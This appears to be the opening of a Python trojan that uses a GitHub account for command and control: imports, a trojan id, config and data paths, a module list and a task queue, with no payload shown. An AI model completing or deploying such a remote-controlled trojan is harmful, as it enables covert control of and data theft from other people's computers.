import json, base64, sys, time, imp, random, threading, os
from queue import Queue
from github3 import login

trojan_id = "abc" # unique id for this trojan
trojan_config = "{0}.json".format(trojan_id)
data_path = "data/{0}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = Queue()